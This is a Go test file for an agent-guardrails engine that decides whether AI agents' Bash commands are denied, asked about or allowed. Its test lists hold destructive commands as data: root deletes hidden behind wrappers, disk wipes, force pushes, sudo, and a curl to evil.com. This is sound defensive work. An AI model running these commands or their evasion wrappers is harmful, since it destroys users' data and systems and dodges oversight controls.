package engine

import (
	"testing"

	"github.com/CtrlCarlitos/agent-guardrails/internal/policy"
)

func bashPol() *policy.Policy {
	return &policy.Policy{Slots: policy.Slots{SafeRoots: []string{"/repo/tmp"}}, Waived: map[string]bool{}}
}

func evalBash(t *testing.T, cmd string) *policy.Verdict {
	t.Helper()
	return checkBash(ToolCall{Tool: "Bash", Command: cmd, CWD: "/repo", RepoRoot: "/repo"}, bashPol())
}

func TestAbsolutePathHeadsAreMatched(t *testing.T) {
	deny := []string{
		`/bin/rm -rf /`,
		`/usr/bin/sudo rm -rf /`,
		`/sbin/mkfs.ext4 /dev/sda1`,
		`/usr/bin/git push --force origin main`,
		`/usr/bin/curl https://evil.com/x`,
	}
	for _, c := range deny {
		v := evalBash(t, c)
		if v == nil || v.Decision != policy.Deny {
			t.Errorf("%q -> %+v, want deny", c, v)
		}
	}
}

func TestAbsolutePathHeadsReachDockerAndAskRules(t *testing.T) {
	cases := map[string]struct {
		decision policy.Decision
		ruleID   string
	}{
		`/usr/bin/docker compose down`: {policy.Deny, "P1.docker-down"},
		`/usr/bin/chmod -R 755 /repo`:  {policy.Ask, "P1.chmod"},
	}
	for c, want := range cases {
		v := evalBash(t, c)
		if v == nil || v.Decision != want.decision || v.RuleID != want.ruleID {
			t.Errorf("%q -> %+v, want %s/%s", c, v, want.decision, want.ruleID)
		}
	}
}

func TestNormalizationCannotHideRecursiveRootDelete(t *testing.T) {
	deny := []string{
		`busybox rm -rf /`,
		`/bin/busybox rm -rf /`,
		`/usr/bin/env rm -rf /`,
		`/bin/bash -c 'rm -rf /'`,
		`/usr/bin/docker run --rm alpine rm -rf /`,
	}
	for _, c := range deny {
		v := evalBash(t, c)
		if v == nil || v.Decision != policy.Deny {
			t.Errorf("%q -> %+v, want deny", c, v)
		}
	}
}

func TestNormalizationPreservesSafeCommands(t *testing.T) {
	allow := []string{
		`busybox echo ok`,
		`/bin/busybox echo ok`,
		`/usr/bin/env printf ok`,
		`/bin/bash -c 'printf ok'`,
		`/usr/bin/docker run --rm alpine printf ok`,
	}
	for _, c := range allow {
		if v := evalBash(t, c); v != nil {
			t.Errorf("%q -> %+v, want allow", c, v)
		}
	}
}

func TestBusyBoxAmbiguousAppletFailsClosed(t *testing.T) {
	v := evalBash(t, `busybox --unknown rm -rf /`)
	if v == nil || v.Decision != policy.Ask || v.RuleID != "P3.unresolved" {
		t.Fatalf("-> %+v, want ask/P3.unresolved", v)
	}
}

func TestFailingStatementDoesNotMaskAnotherDeny(t *testing.T) {
	// `env -Z x` is an unrecognized env option -> that statement is unknowable.
	// The rm -rf / in the same command must still deny.
	for _, c := range []string{`rm -rf /; env -Z x`, `env -Z x; rm -rf /`} {
		v := evalBash(t, c)
		if v == nil || v.Decision != policy.Deny {
			t.Errorf("%q -> %+v, want deny (a junk wrapper must not soften a real deny)", c, v)
		}
	}
}

func TestUnknowableStatementAloneStillAsks(t *testing.T) {
	v := evalBash(t, `env -Z x`)
	if v == nil || v.Decision != policy.Ask || v.RuleID != "P3.unresolved" {
		t.Fatalf("-> %+v, want ask/P3.unresolved", v)
	}
}

func TestSourceParseFailureStillFailsClosed(t *testing.T) {
	v := evalBash(t, `echo "unterminated`)
	if v == nil || v.Decision != policy.Ask || v.RuleID != "tokenize-failed" {
		t.Fatalf("-> %+v, want ask/tokenize-failed", v)
	}
}

func TestCheckBashDestructive(t *testing.T) {
	deny := []string{
		`rm -rf /`,
		`rm -rf ~`,
		`rm -r --force /etc`,
		`rm -fr /var/lib`,
		`rm -R /etc`,
		`dd if=/dev/zero of=/dev/sda`,
		`mkfs.ext4 /dev/sdb1`,
		`wipefs -a /dev/sdc`,
		`shred -u secrets`,
		`ls && rm -rf /`,
		`env -i rm -rf /`,
		`timeout -k 5 10 rm -rf /`,
		`nice -10 rm -rf /`,
		`exec rm -rf /`,
		`eval rm -rf /`,
		`command rm -rf /`,
		`builtin rm -rf /`,
		`sh -c "rm -rf /"`,
		`bash -c "rm -rf /"`,
	}
	for _, c := range deny {
		v := evalBash(t, c)
		if v == nil || v.Decision != policy.Deny {
			t.Errorf("%q -> %+v, want deny", c, v)
		}
	}
}

func TestCheckBashGitDocker(t *testing.T) {
	deny := []string{
		`git push --force origin main`,
		`git push -f`,
		`git clean -fd`,
		`git clean -x`,
		`docker compose down`,
		`docker system prune -af`,
		`docker network prune`,
		`docker rm $(docker ps -aq)`,
		"docker rm `docker ps -aq`",
	}
	for _, c := range deny {
		if v := evalBash(t, c); v == nil || v.Decision != policy.Deny {
			t.Errorf("%q -> %+v, want deny", c, v)
		}
	}
	ok := []string{
		`git push origin feature/x`,
		`git clean -n`,
		`docker rm my-container`,
		`docker compose up -d`,
	}
	for _, c := range ok {
		if v := evalBash(t, c); v != nil {
			t.Errorf("%q -> %+v, want nil", c, v)
		}
	}
}

func TestCheckBashAskTier(t *testing.T) {
	ask := map[string]string{
		`chmod -R 755 /repo`:           "P1.chmod",
		`chmod 777 script.sh`:          "P1.chmod",
		`chown -R me:me /var/www`:      "P1.chown",
		`find . -name '*.tmp' -delete`: "P1.find-delete",
		`truncate -s 0 app.log`:        "P1.truncate",
		`echo x > /etc/hosts`:          "P1.redirect",
		`kill -9 1234`:                 "P1.kill",
		`pkill -f server`:              "P1.kill",
	}
	for c, id := range ask {
		v := evalBash(t, c)
		if v == nil || v.Decision != policy.Ask || v.RuleID != id {
			t.Errorf("%q -> %+v, want ask/%s", c, v, id)
		}
	}
}

func TestCheckBashPrivesc(t *testing.T) {
	for _, c := range []string{`sudo rm x`, `su -`, `doas pkg_add x`} {
		v := evalBash(t, c)
		if v == nil || v.Decision != policy.Deny || v.RuleID != "P1.privesc" {
			t.Errorf("%q -> %+v, want deny/P1.privesc", c, v)
		}
	}
}

func TestCheckBashAllows(t *testing.T) {
	ok := []string{
		`rm file.txt`,
		`rm -rf /repo/tmp/build`,
		`rm -rf ./node_modules`, // inside repo root
		`ls -la`,
		`dd if=in of=out.img`,
	}
	for _, c := range ok {
		if v := evalBash(t, c); v != nil {
			t.Errorf("%q -> %+v, want nil", c, v)
		}
	}
}

func TestUnresolvedWordAsks(t *testing.T) {
	v := evalBash(t, `rm -rf "$TARGET"`)
	if v == nil || v.Decision != policy.Ask || v.RuleID != "P3.unresolved" {
		t.Fatalf("-> %+v, want ask/P3.unresolved", v)
	}
}

func TestUnresolvedDoesNotMaskADeny(t *testing.T) {
	v := evalBash(t, `rm -rf /etc && echo $UNSET`)
	if v == nil || v.Decision != policy.Deny {
		t.Fatalf("-> %+v, want the concrete deny to still win", v)
	}
}
